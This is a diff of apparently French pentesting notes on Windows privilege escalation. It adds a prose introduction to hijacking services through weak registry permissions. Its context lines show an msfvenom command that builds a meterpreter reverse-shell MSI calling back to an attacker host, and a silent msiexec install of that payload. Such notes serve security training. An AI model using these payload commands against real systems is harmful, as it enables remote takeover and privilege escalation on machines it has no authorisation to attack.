@@ -48,3 +48,14 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f ms
 
 msiexec /quiet /qn /i shell.msi
 ```
+
+
+
+
+## Weak registry escalation
+Microsoft Windows offre un large éventail d'autorisations et de privilèges très précis pour contrôler l'accès aux composants de Windows, notamment les services, les fichiers et les entrées de registre. L'exploitation des permissions faibles du registre est une technique permettant d'augmenter les privilèges.
+
+En détournant les entrées du registre utilisées par les services, les attaquants peuvent exécuter leurs charges utiles malveillantes. Les attaquants peuvent utiliser les faiblesses des autorisations du registre pour détourner l'exécutable initialement prévu vers un exécutable qu'ils contrôlent au démarrage du service, ce qui leur permet d'exécuter leurs logiciels malveillants non autorisés.
+**Windows Registry**
+Le registre est une base de données définie par le système dans laquelle les applications et les composants du système stockent et récupèrent des données de configuration. Le registre est une base de données hiérarchique qui contient des données essentielles au fonctionnement de Windows et des applications et services qui s'exécutent sur Windows.
+
